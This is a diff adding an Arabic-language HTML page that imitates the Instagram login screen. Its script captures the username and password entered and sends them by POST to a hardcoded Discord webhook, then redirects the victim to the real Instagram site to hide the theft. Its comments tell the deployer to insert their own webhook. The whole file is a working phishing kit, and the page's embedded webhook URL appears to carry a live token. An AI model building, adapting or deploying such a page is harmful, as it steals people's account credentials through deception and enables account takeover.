@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+
+<html lang="ar" dir="rtl">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>تسجيل الدخول</title>
+
+<style>
+
+* { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', sans-serif; }
+
+
+body {
+
+background: linear-gradient(135deg, #ffffff 0%, #f1f3f4 100%);
+
+display:flex; justify-content:center; align-items:center; height:100vh;
+
+}
+
+
+
+.card {
+
+width: 350px; background: #fff; border: 1px solid #ddd;
+
+border-radius: 10px; padding: 40px 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+
+}
+
+
+
+.header-logo { text-align: center; margin-bottom: 30px; }
+
+
+.insta-icon {
+
+width: 60px; height: 60px;
+
+margin: 0 auto 10px;
+
+background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+
+border-radius: 15px;
+
+display: flex; justify-content: center; align-items: center;
+
+color: white;
+
+}
+
+
+
+.header-logo h1 { font-family: sans-serif; font-size: 35px; color: #262626; }
+
+
+
+input {
+
+width:100%; padding: 12px; margin-bottom: 10px;
+
+border: 1px solid #ddd; border-radius: 5px; background: #fafafa;
+
+}
+
+button {
+
+width:100%; padding: 10px; border:none; border-radius: 5px;
+
+background: #0095f6; color: #fff; font-weight: bold; cursor: pointer;
+
+}
+
+.or { text-align:center; color:#888; margin:20px 0; font-size: 13px; }
+
+a { text-decoration:none; color:#00376b; display:block; text-align:center; margin-top:10px; font-size: 13px; }
+
+.signup { text-align:center; margin-top:25px; font-size: 14px; }
+
+</style>
+
+</head>
+
+<body>
+
+
+
+<div class="card">
+
+<div class="header-logo">
+
+<div class="insta-icon">
+
+<svg width="35" height="35" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+
+<rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
+
+<path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
+
+<line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
+
+</svg>
+
+</div>
+
+<h1>Instagram</h1>
+
+</div>
+
+
+
+<!-- تم تغيير الزر ليصبح submit داخل الـ form -->
+
+<form id="loginForm">
+
+<input type="text" id="username" placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" required>
+
+<input type="password" id="password" placeholder="كلمة المرور" required>
+
+<button type="submit">تسجيل الدخول</button>
+
+<div class="or">أو</div>
+
+<a href="#">هل نسيت كلمة السر؟</a>
+
+<div class="signup">
+
+ليس لديك حساب؟ <a href="#" style="display:inline; color:#0095f6;">تسجيل</a>
+
+</div>
+
+</form>
+
+</div>
+
+
+
+<script>
+
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+
+e.preventDefault();
+
+
+
+const user = document.getElementById('username').value;
+
+const pass = document.getElementById('password').value;
+
+
+// ضع رابط الـ Webhook الخاص بك هنا بين علامتي التنصيص
+
+const webhookUrl = 'https://discord.com/api/webhooks/1525600480800018443/0fXXC208nP-Hbj4BaM1HBQtjg62lf5IHe_XechQEAbRlvWU_MJbl9Nrms5lzhYNmNvrQ';
+
+
+
+const payload = {
+
+embeds: [{
+
+title: "تم استلام بيانات دخول جديدة",
+
+fields: [
+
+{ name: "اسم المستخدم", value: user, inline: false },
+
+{ name: "كلمة المرور", value: pass, inline: false }
+
+],
+
+color: 3447003
+
+}]
+
+};
+
+
+
+try {
+
+await fetch(webhookUrl, {
+
+method: 'POST',
+
+headers: { 'Content-Type': 'application/json' },
+
+body: JSON.stringify(payload)
+
+});
+
+// بعد الإرسال، يمكنك إعادة توجيه المستخدم لصفحة إنستغرام الأصلية
+
+window.location.href = "https://www.instagram.com/";
+
+} catch (error) {
+
+console.error('Error:', error);
+
+alert('حدث خطأ، يرجى المحاولة لاحقاً.');
+
+}
+
+});
+
+</script>
+
+
+
+</body>
+
+</html> 
+
